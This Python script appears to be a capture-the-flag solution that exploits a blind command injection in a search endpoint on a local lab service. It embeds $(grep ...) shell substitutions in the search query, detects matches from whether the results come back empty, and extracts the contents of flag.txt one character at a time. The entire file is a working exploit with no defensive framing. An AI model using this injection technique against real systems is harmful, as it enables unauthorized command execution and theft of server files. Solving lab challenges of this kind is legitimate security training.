import requests

HOST = "localhost"
PORT = 3700

url = f"http://{HOST}:{PORT}/vault/search?q="

single_res_q = "biomorph" #need a search query that returns a single result

charspace = "abcdefghijklmnopqrstuvwxyz"
charspace += charspace.upper()
charspace += "0123456789"
charspace += "_{}"

valid_chars = ""
for char in charspace:
    query = single_res_q + f"$(grep {char} flag.txt)"
    if not requests.get(url + query).json()["results"]:
        valid_chars += char
    print(f"valid characters: {valid_chars}", end="\r")

flag = ""
while True:
    if flag and flag[-1] == "}":
        break
    for char in valid_chars:
        tmp_flag = flag + char
        print(tmp_flag)
        query = single_res_q + f"$(grep ^{tmp_flag} flag.txt)"
        if not requests.get(url + query).json()["results"]:
            flag += char
            print(flag, end="\r")
            break
